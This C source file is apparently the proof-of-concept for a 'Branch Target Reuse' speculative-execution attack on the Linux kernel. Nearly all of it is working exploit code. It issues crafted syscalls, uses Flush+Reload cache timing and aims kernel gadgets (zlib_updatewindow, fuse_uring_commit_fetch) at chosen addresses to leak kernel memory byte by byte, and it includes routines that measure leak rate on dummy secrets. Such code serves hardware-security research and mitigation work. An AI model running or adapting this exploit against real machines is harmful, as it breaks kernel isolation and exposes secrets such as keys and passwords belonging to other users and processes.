/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <syscall.h>
#include <sys/time.h>

#include "flush_and_reload.h"
#include "targets.h"
#include "common.h"
#include "controller.h"

static __always_inline int trigger_victim(struct config *cfg) {

    // rdi (0x10), rsi (0x18), rdx (0x20), r10 (0x28), r8 (0x30), and r9 (0x38)
    if (cfg->constant_blind_safe == 0) {
        asm volatile(
            "mov %%rbx, %%r9\n"
            "push %%rax\n"
            "syscall\n"
            "pop %%rax\n"
            :
            :
                "a" (cfg->target_gadget_32), // syscall number
                "D" (cfg->arg_tfp),
                "S" (cfg->arg_fr_buf), // +0x18 (rsi)
                "d" (cfg->arg_cmp_value), // 0x20 (rdx)
                "b" (cfg->arg_secret_address) // +0x38 (r9)
            : "r11", "rcx", "r9"

      );

    } else {
        asm volatile(
            "mov %%rbx, %%r9\n"
            "push %%rax\n"
            "syscall\n"
            "pop %%rax\n"
            :
            :
                "a" (0xdead10), // syscall number
                "D" (cfg->arg_ind_map),
                "S" (0), // +0x18 (rsi)
                "d" (0), // 0x20 (rdx)
                "b" (0) // +0x38 (r9)
            : "r11", "rcx", "r9"

      );
    }

    return 0;

}

uint8_t * evict_filter_struct(struct config * cfg) {
    char buf[18];
    uint8_t * address;

    assert(pread64(cfg->fd_evict, buf, 18, 0));

    assert(sscanf(buf, "%lx", (uint64_t *) &address) == 1);

    return address;

}


uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    char buf_test[17];
    uint64_t hits = 0;

    assert(iterations ==1 );

    for(int iter=0; iter < 1; iter++) {

        if (cfg->debug_evict) {
            read_uint64_from_fd(cfg->fd_evict);
        } else {
            for (size_t i = 0; i < 2; i++)
            {
                if (cfg->ev_set_l2_prog[0]) {
                    evict(cfg->ev_set_l2_prog);
                    asm volatile("lfence\n");
                }
                if (cfg->ev_set_l3[0]) {
                    evict(cfg->ev_set_l3);
                    asm volatile("lfence\n");
                }
            }
        }
        asm volatile("lfence\n");

        // trigger
        trigger_victim(cfg);
        cpuid();

        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;


}

static uint64_t total_time_ready;
static uint64_t total_time_insertion;
static uint64_t total_w_iter_ready;
static uint64_t total_w_iter_insertion;


int do_train_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {
    uint64_t hits = 0;
    uint64_t w_time = 0;

    struct timeval t0, t1;

    total_time_ready = 0;
    total_time_insertion = 0;
    total_w_iter_ready = 0;
    total_w_iter_insertion = 0;

    for(uint64_t iter=0; iter < iterations; iter++) {

        asm volatile("prefetcht0 (%0)" :: "r" (cfg->fr_buf_kern));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->leak_gadget_address[cfg->gadget_nr]));
        flush(cfg->reload_addr);
        asm volatile("sfence\n");

        w_time = 0;
        usleep(1);  // required for syncing
        while (controller_status != CONT_GADGET_INSERTED) {
            sched_yield();
            if (++w_time % 100000 == 0) {
                printf("Waiting for CONT_GADGET_INSERTED! %lu\n", w_time);
            }
        }

        hits += do_flush_and_reload(cfg, 1, 1);

        controller_status = CONT_CLEAN_UP;
        if (ret_on_hit && hits) {
            break;
        }

    }

    fflush(stdout);


    return hits;

}


static uint64_t total_time_train_and_reload;


void print_leakage_rate(struct config * cfg, uint64_t iterations) {
    uint64_t hits[3];
    printf("      L2    L3\n");

    uint64_t total_hits = 0;
    struct timeval t0, t1;
    total_time_train_and_reload = 0;

    for (size_t i = 0; i < 10; i++)
    {
        for (size_t loads = 1; loads < 3; loads++) {hits[loads] = 0;};

        for (size_t loads = 1; loads < 3; loads++)
        {
            set_load_chain_n_loads(cfg, loads + 1);


            gettimeofday(&t0, NULL);
            hits[loads] = do_train_and_reload(cfg, iterations, 0);
            gettimeofday(&t1, NULL);

            total_hits += hits[loads];
            total_time_train_and_reload += (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);


        }
        printf("Hits: %4lu  %4lu /%4lu  Evict: %d Debug: %d\n", hits[1], hits[2], iterations, cfg->do_evict, cfg->debug_evict);
        fflush(stdout);
    }

    printf("Iteration Avg time: %4.1f us. Hit rate: %4.3f\n", (double) total_time_train_and_reload / 10 / 2 / iterations, (double) total_hits / 10  / 2 / iterations);

}


void print_reuse_rate(struct config * cfg) {
    cfg->capture_reuse_rate = 1;
    set_load_chain_n_loads(cfg, 3);

    for (size_t i = 0; i < 10; i++)
    {
        do_train_and_reload(cfg, cfg->constant_blind_safe ? 100 : 1000, 0);
        fflush(stdout);
    }
}

int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset, hits;

    cfg->reload_addr = cfg->fr_buf;

    for (size_t outer = 0; outer < 1; outer++)
    {
        for (uint64_t byte = 0x0; byte <= 0xff; byte++) {

            fr_offset = (byte << 24);
            fr_offset = (prefix + fr_offset);

            if (cfg->gadget_nr == 0) {
                *cfg->ind_base_addr = (uint64_t)(cfg->fr_buf_kern + fr_offset);
            } else {
                if (fr_offset == 0 && outer < 2) {
                    // fr_buf arg is touched in gadget path
                    continue;
                }
                *cfg->ind_base_addr = (uint64_t)(cfg->fr_buf_kern - fr_offset);
            }

            hits = do_train_and_reload(cfg, 1, 1);

            if (hits) {
                return (int) byte;
            }
        }

    }

    return -1;

}


int find_cache_line(struct config * cfg, uint64_t prefix) {
    uint64_t fr_offset, cur_hit;
    uint64_t hits[4] = {0};
    uint64_t total_hits = 0;
    int byte = 0;
    int idx;
    int ret;

    cfg->fr_buf = cfg->ind_map + 0x20000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x20000;
    cfg->reload_addr = cfg->fr_buf;

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (byte = 0xc0; byte >= 0x0; byte-=0x40) {
            idx = byte / 64;

            fr_offset = byte;
            fr_offset = (prefix + fr_offset);

            if (fr_offset == 0 && outer < 2) {
                // fr_buf arg is touched in gadget path
                continue;
            }

            *cfg->ind_base_addr = (uint64_t)(cfg->fr_buf_kern  - fr_offset);


            cur_hit = do_train_and_reload(cfg, 100, 0);
            hits[idx] += cur_hit;
            total_hits += cur_hit;


        }

        if (outer >= 1 && total_hits) {
            break;
        }

    }

    int max_hits = -1;
    for (idx = 0; idx < 4; idx++) {
        printf("A   CL %2x: %lu\n", idx * 64, hits[idx]);
        if ((int) hits[idx] > max_hits){
            max_hits = hits[idx];
            ret = idx * 64;
        }
    }

    cfg->fr_buf = cfg->ind_map + 0x20000 - 0x40;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x20000 - 0x40;
    cfg->reload_addr = cfg->fr_buf;

    memset(hits, 0, sizeof(hits));

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (byte = 0xc0; byte >= 0x0; byte-=0x40) {
            idx = byte / 64;

            fr_offset = byte;
            fr_offset = (prefix + fr_offset);

            if (fr_offset == 0 && outer < 2) {
                // fr_buf arg is touched in gadget path
                continue;
            }

            *cfg->ind_base_addr = (uint64_t)(cfg->fr_buf_kern  - fr_offset);


            cur_hit = do_train_and_reload(cfg, 100, 0);
            hits[idx] += cur_hit;
            total_hits += cur_hit;


        }

        if (outer >= 1 && total_hits) {
            break;
        }

    }

    for (idx = 0; idx < 4; idx++) {
        printf("B   CL %2x: %lu\n", idx * 64, hits[idx]);
    }

    printf("RET: %2x\n", ret);
    return ret;

}

uint64_t leak_64bit_value_forwards(struct config * cfg, uint8_t * address, uint32_t prefix) {

    uint32_t cur_prefix;
    uint64_t iter;
    int found;
    uint8_t leaked_bytes[8 + 3] = {0};
    *(uint32_t *) leaked_bytes = prefix;
    uint8_t * cur_byte = &leaked_bytes[3];

    uint8_t * old_arg_secret_address = cfg->arg_secret_address;
    *cfg->ind_secret_addr = (uint64_t) address - cfg->secret_address_offset - 3;

    cfg->fr_buf = cfg->ind_map + 0x20000;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x20000;

    for (int i = 0; i < 8; i++)
    {
        iter = 0;
        cur_prefix = *((uint32_t *) (cur_byte - 3));

        found = leak_byte_forwards(cfg, cur_prefix);
        while (found == -1 ) {
            found = leak_byte_forwards(cfg, cur_prefix);
            iter++;
            if (iter == 100) {
                printf("Failed finding byte at %p. cur_prefix: 0x%08x\n", address + i, cur_prefix);
                return -1;
            }

        }

        *cur_byte = found;


        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

    }

    *cfg->ind_secret_addr = (uint64_t) old_arg_secret_address;

    return *((uint64_t *) (leaked_bytes + 3));
}



 int is_signature_at_address(struct config * cfg, uint32_t signature, uint8_t * address, uint64_t iterations, uint8_t ret_on_hit) {
    uint64_t offset;
    int hits;

    offset = signature;
    *cfg->ind_base_addr = (uint64_t)(cfg->fr_buf_kern  + offset);
    *cfg->ind_secret_addr = (uint64_t) address - cfg->secret_address_offset;

    hits = do_train_and_reload(cfg, iterations, ret_on_hit);

    return hits;
}

void set_load_chain_n_loads(struct config * cfg, int number_of_loads) {

// ------------------------------------------------------------------------
//    0xffffffff8189809b <zlib_updatewindow+11>:   mov    r14,rdi
//    0xffffffff8189809e <zlib_updatewindow+14>:   push   r13
//    0xffffffff818980a0 <zlib_updatewindow+16>:   push   r12
//    0xffffffff818980a2 <zlib_updatewindow+18>:   push   rbx
//    0xffffffff818980a3 <zlib_updatewindow+19>:   mov    r13,QWORD PTR [rdi+0x38]  // secret address load
//    0xffffffff818980a7 <zlib_updatewindow+23>:   mov    ebx,esi
//    0xffffffff818980a9 <zlib_updatewindow+25>:   sub    ebx,DWORD PTR [rdi+0x20]  // load for cmp
//    0xffffffff818980ac <zlib_updatewindow+28>:   mov    rsi,QWORD PTR [r14+0x18]  // base load
//    0xffffffff818980b0 <zlib_updatewindow+32>:   mov    edx,DWORD PTR [r13+0x2c]  // SECRET LOAD
//    0xffffffff818980b4 <zlib_updatewindow+36>:   mov    rdi,QWORD PTR [r13+0x38]  // memcpy destination, not needed
//    0xffffffff818980b8 <zlib_updatewindow+40>:   cmp    ebx,edx
//    0xffffffff818980ba <zlib_updatewindow+42>:   jb     0xffffffff818980e9 <zlib_updatewindow+89>
//    0xffffffff818980bc <zlib_updatewindow+44>:   sub    rsi,rdx
//    0xffffffff818980bf <zlib_updatewindow+47>:   call   0xffffffff8224ad80 <memcpy>

    memset(cfg->ind_map, 0, 0x100);
    cfg->arg_tfp = 0;   // rdi + 0x10
    cfg->arg_secret_address = 0; /// rdi + 0x20 // rdi + 0x38
    cfg->arg_fr_buf = 0;  // rdi + 0x28 // rdi + 0x18


    if (cfg->constant_blind_safe == 0) {
        switch (number_of_loads)
        {
        case 1:
            cfg->arg_tfp = cfg->fr_buf;
            cfg->arg_secret_address = cfg->secret_addr_kern - cfg->secret_address_offset;
            break;
        case 2:
            cfg->arg_tfp = (uint8_t *) cfg->debug_gadget_address;
            cfg->arg_secret_address = cfg->fr_buf_kern - cfg->secret_address_offset;
            cfg->arg_fr_buf = cfg->fr_buf_kern;
            break;

        case 3:
            cfg->arg_tfp = (uint8_t *) cfg->debug_gadget_address;
            cfg->arg_secret_address = cfg->secret_addr_kern - cfg->secret_address_offset;
            if (cfg->gadget_nr == 0) {
                *(uint32_t *)cfg->secret_addr = 0x0;
                cfg->arg_fr_buf = cfg->fr_buf_kern;
            } else {
                *(uint32_t *)cfg->secret_addr = 0xdeadbeef;
                cfg->arg_fr_buf = cfg->fr_buf_kern - 0xdeadbeef;
            }
            break;
        }
    } else {
        // constant blind safe
        // ------------------------------------------------------------------------
        //    <fuse_uring_commit_fetch+22>:     mov    rax,QWORD PTR [rdi+0x8] ; load secret address
        //    <fuse_uring_commit_fetch+26>:     mov    rcx,QWORD PTR [rdx+0x230] ; load &base
        //    <fuse_uring_commit_fetch+33>:     mov    DWORD PTR [rbp-0x2c],esi ;
        //    <fuse_uring_commit_fetch+36>:     mov    rbx,QWORD PTR [rax+0x38] ;
        //    <fuse_uring_commit_fetch+40>:     movzx  eax,WORD PTR [rax+0x40] ; load secret 16-byte
        //    <fuse_uring_commit_fetch+44>:     mov    QWORD PTR [rbp-0x38],rbx ;
        //    <fuse_uring_commit_fetch+48>:     test   rcx,rcx
        //    <fuse_uring_commit_fetch+51>:     je     0xffffffff81991603 <fuse_uring_commit_fetch+595>
        //    <fuse_uring_commit_fetch+57>:     cmp    rax,QWORD PTR [rcx+0x8]
        //    <fuse_uring_commit_fetch+61>:     jae    0xffffffff81991614 <fuse_uring_commit_fetch+612>
        //    <fuse_uring_commit_fetch+67>:     mov    rcx,QWORD PTR [rcx+0x18] ; load base address
        //    <fuse_uring_commit_fetch+71>:     mov    r12,QWORD PTR [rcx+rax*8] ; transmit
        switch (number_of_loads)
        {
        case 1:
            cfg->arg_ind_map = (uint8_t *) cfg->fr_buf_kern;

            break;
        case 2:

            cfg->arg_ind_map = (uint8_t *) cfg->fr_buf_kern;

            break;

        case 3:
            cfg->arg_ind_map = (uint8_t *) cfg->ind_map_kern;
            *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->debug_gadget_address;
            *(uint64_t *)(cfg->ind_map + 0x8) = (uint64_t) cfg->secret_addr_kern - cfg->secret_address_offset;
            cfg->ind_secret_addr = (uint64_t * ) (cfg->ind_map + 0x8);

            *(uint64_t *)(cfg->ind_map + 0x230) = (uint64_t)(cfg->ind_map_kern + 0x10 - 0x18);
            *(uint64_t *)(cfg->ind_map + 0x10) = (uint64_t) cfg->fr_buf_kern;
            cfg->ind_base_addr = (uint64_t * ) (cfg->ind_map + 0x10);

            *(uint32_t *)cfg->secret_addr = 0x0;

            break;


        }

    }
}

// ----------------------------------------------------------------------------
// Load chain setup functions
//
// ----------------------------------------------------------------------------

void set_load_chain_leak_secret(struct config * cfg)
{
// ------------------------------------------------------------------------

    if (cfg->constant_blind_safe == 0) {

        cfg->arg_tfp = (uint8_t *) cfg->debug_gadget_address;
        cfg->arg_secret_address = cfg->secret_addr_kern - cfg->secret_address_offset;
        cfg->ind_secret_addr = (uint64_t *) &cfg->arg_secret_address;
        cfg->ind_base_addr = (uint64_t * ) &cfg->arg_fr_buf;

    } else {
        cfg->arg_ind_map = (uint8_t *) cfg->ind_map_kern;
        *(uint64_t *)(cfg->ind_map) = (uint64_t) cfg->debug_gadget_address;
        *(uint64_t *)(cfg->ind_map + 0x38) = (uint64_t) cfg->secret_addr_kern - cfg->secret_address_offset;
        cfg->ind_secret_addr = (uint64_t *) (cfg->ind_map + 0x38);

        *(uint64_t *)(cfg->ind_map + 0x18) = (uint64_t) cfg->fr_buf_kern;
        cfg->ind_base_addr = (uint64_t * ) (cfg->ind_map + 0x18);
    }
}


// ----------------------------------------------------------------------------
// Leak test functions
//
// ----------------------------------------------------------------------------

// ----------------------------------------------------------------------------
// Leak Core functions
//
// ----------------------------------------------------------------------------


void leak_n_bytes(struct config * cfg, char * buf, int n, uint8_t * address, uint32_t prefix) {
    uint32_t cur_prefix;
    int found;
    uint8_t * cur_byte;
    *cfg->ind_secret_addr = (uint64_t) address - cfg->secret_address_offset;

    cur_byte = (uint8_t *) &buf[3];
    *(uint32_t *) buf = prefix;

    for (int i = 3; i < n; i++)
    {
        cur_prefix = *(uint32_t *) (cur_byte - 3);
        // printf("Using prefix: 0x%08x\n", cur_prefix);

        found = leak_byte_forwards(cfg, cur_prefix);
        while (found == -1 ) {
            found = leak_byte_forwards(cfg, cur_prefix);
        }


        *cur_byte = found;

        printf("%c", *cur_byte >= 0xa && *cur_byte < 0x7E ? *cur_byte : '.');
        fflush(stdout);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;
    }

    printf("\n");

    return;

}

#define LEAK_RATE_TEST_SIZE (128) // 128 bytes;

void leak_test_leakage_rate(struct config * cfg) {

    // ------------------------------------------------------------------------
    // Initialize a random buffer to leak

    // We initialize the secret from the fifth 4k page onwards
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++) {
        secret[i] = ((uint8_t) rand());
    }
    memset(secret, 0, 3); // First 3 bytes are zero to start the leak

    uint8_t * leaked_bytes = calloc(1, LEAK_RATE_TEST_SIZE);

    set_load_chain_leak_secret(cfg);

    // ------------------------------------------------------------------------
    // Start the leak

    uint64_t prefix;
    uint8_t * cur_byte;
    int found;

    *cfg->ind_secret_addr = (uint64_t) secret_kern - cfg->secret_address_offset;
    cur_byte = (uint8_t *) leaked_bytes + 3;

    printf("[%50s]", "");
    int step = 0;
    fflush(stdout);

    struct timeval t0, t1;
    uint64_t delta_us, total_delta;
    total_delta = 0;

    gettimeofday(&t0, NULL);


    struct timeval b0, b1;


    for (int i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        prefix = *((uint32_t *) (cur_byte - 3));

        // gettimeofday(&b0, NULL);
        found = leak_byte_forwards(cfg, prefix);

        size_t iter = 0 ;
        while (found == -1 ) {
            if (iter == 1000) {
                printf("\nStuck! Please try again. (IDX: %d Last leaked byte: %x, Last Secret byte: %x)\n", i, *(cur_byte - 1), secret[i + 3 - 1]);
                free(leaked_bytes);
                return;
            }

            found = leak_byte_forwards(cfg, prefix);
            iter++;

        }
        // gettimeofday(&b1, NULL);
        // delta_us = (b1.tv_sec - b0.tv_sec) * 1000000 + (b1.tv_usec - b0.tv_usec);
        // total_delta += delta_us;
        // fflush(stdout);
        // printf("ITER: %d Time: %d us\n", iter , delta_us);

        *cur_byte = found;
        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

        if (i % (LEAK_RATE_TEST_SIZE / 50) == 0) {
            step++;
            printf("\r[%.*s", step, "..................................................");
            fflush(stdout);
        }

    }

    gettimeofday(&t1, NULL);

    delta_us = (t1.tv_sec - t0.tv_sec) * 1000000 + (t1.tv_usec - t0.tv_usec);

    printf("\nAVG time per byte: %ld\n", delta_us / LEAK_RATE_TEST_SIZE);
    printf("\n%d bytes took %4.1f seconds (%5.1f Byte/sec)\n", LEAK_RATE_TEST_SIZE, (double) delta_us / 1000000, LEAK_RATE_TEST_SIZE / ( (double) delta_us / 1000000));

    // ------------------------------------------------------------------------
    // Verify for any faults

    uint64_t incorrect = 0;

    for (size_t i = 0; i < LEAK_RATE_TEST_SIZE; i++)
    {
        if (secret[i] != leaked_bytes[i]) {
            incorrect += 1;
        }
    }

    printf("Fault rate: %05.3f%%\n", ((double) incorrect / LEAK_RATE_TEST_SIZE) * 100);

    free(leaked_bytes);

}


#define DUMMY_SECRET_LENGTH 29

void leak_dummy_secret(struct config * cfg) {

    // ------------------------------------------------------------------------
    // We setup a dummy secret and try to leak it

    // Initialize secret
    uint8_t *secret = cfg->ind_map + 0x2000;
    uint8_t *secret_kern = cfg->ind_map_kern + 0x2000;

    // To test the zero extend prefix

    for (size_t i = 3; i < DUMMY_SECRET_LENGTH; i++) {
        secret[i] = (uint8_t) ('A' + i - 3);
    }

    // memset(secret, 0x1, DUMMY_SECRET_LENGTH);
    memset(secret, 0x0, 3);
    // secret[3] = 0x80;
    // secret[4] = 0xde;


    printf("%15s: 0x%016lx\n", "secret addr user", (uint64_t)secret);
    printf("%15s: 0x%016lx\n", "secret addr kern", (uint64_t)secret_kern);


    set_load_chain_leak_secret(cfg);

    uint8_t leaked_bytes[DUMMY_SECRET_LENGTH] = {0};
    uint64_t prefix;
    int found;

    cfg->reload_addr = cfg->fr_buf;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - cfg->secret_address_offset;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 3;

    uint64_t iter = 0;


    for (unsigned i = 3; i < DUMMY_SECRET_LENGTH; i++)
    {
        prefix = *((uint32_t *) (cur_byte - 3));

        found = leak_byte_forwards(cfg, prefix);
        while (found == -1 ) {
            found = leak_byte_forwards(cfg, prefix);
            iter += 1;
        }

        *cur_byte = found;

        printf("0x%03x: Found Byte: 0x%02x (%c) Used prefix: 0x%08lx\n", i, *cur_byte, *cur_byte, prefix);
        printf("Iter: %ld\n", iter);
        // leak_64bit_value_forwards(cfg, cfg->arg_secret_address + cfg->secret_address_offset+ 3, prefix);

        cur_byte += 1;
        *cfg->ind_secret_addr += 1;

    }

    printf("Done!\n");

}


void find_cmp_value(struct config * cfg) {

    // ------------------------------------------------------------------------
    // We setup a dummy secret and try to leak it

    // Initialize secret
    uint8_t *secret = cfg->ind_map;
    uint8_t *secret_kern = cfg->ind_map_kern;
    uint64_t hits;

    assert(cfg->gadget_nr == 0);

    printf("%15s: 0x%016lx\n", "secret addr user", (uint64_t)secret);
    printf("%15s: 0x%016lx\n", "secret addr kern", (uint64_t)secret_kern);


    set_load_chain_leak_secret(cfg);

    uint8_t leaked_bytes[DUMMY_SECRET_LENGTH] = {0};
    uint64_t prefix;
    int found ;

    cfg->reload_addr = cfg->fr_buf;
    *cfg->ind_secret_addr = (uint64_t) secret_kern - cfg->secret_address_offset;
    uint8_t * cur_byte = (uint8_t *) leaked_bytes + 3;

retry:
    memset(secret, 0, 4);
    cfg->arg_cmp_value = (uint8_t *) -1;

    for (size_t pos = 4; pos > 1; pos--)
    {
        found = 0;
        for (size_t iter = 0; iter < 10; iter++)
        {
            for (long unsigned byte = 0x0; byte < 0xff; byte++)
            {
                secret[pos - 1] = 0xff - byte;
                hits = is_signature_at_address(cfg, *(uint32_t *) (secret), (secret_kern), 100, 0);
                // printf("    Secret: %08x Hits: %lu\n", *(uint32_t *) (secret), hits);
                if (hits >= 20) {
                    printf("Found secret: %08x Hits: %lu\n", *(uint32_t *) (secret), hits);
                    found = 1;
                    break;
                }
            }
            if (found) {
                break;
            }
        }
        if (found == 0) {
            printf("ERROR, failed finding cmp value\n");
            goto retry;
            // exit(0);
        }

    }

    uint64_t cmp_value = *(uint32_t *) (secret);
    cfg->arg_cmp_value = (uint8_t *) cmp_value;

    found = 0;
    // last bit
    for (size_t iter = 0; iter < 10; iter++)
    {
        for (long unsigned byte = 0x0; byte < 0xff; byte++)
        {
            *(uint32_t *) (secret) = 0xffffffff;
            // cfg->arg_cmp_value = (uint8_t *) ((i << 24) + (i << 16) + (i << 8) + i);
            cfg->arg_cmp_value += 1;
            hits = is_signature_at_address(cfg, *(uint32_t *) (secret), (secret_kern), 100, 0);
            // printf("    cmp value: %08x Hits: %lu\n", (uint32_t) cfg->arg_cmp_value, hits);

            if (hits >= 20) {
                found = 1;
                printf("Found cmp value: %08x Hits: %lu\n", (uint32_t) (uint64_t) cfg->arg_cmp_value, hits);
                break;
            }
        }
        if (found) {
            break;
        }
    }

    if (found == 0) {
        printf("ERROR, failed finding cmp value\n");
        goto retry;
        // exit(0);
    }

}


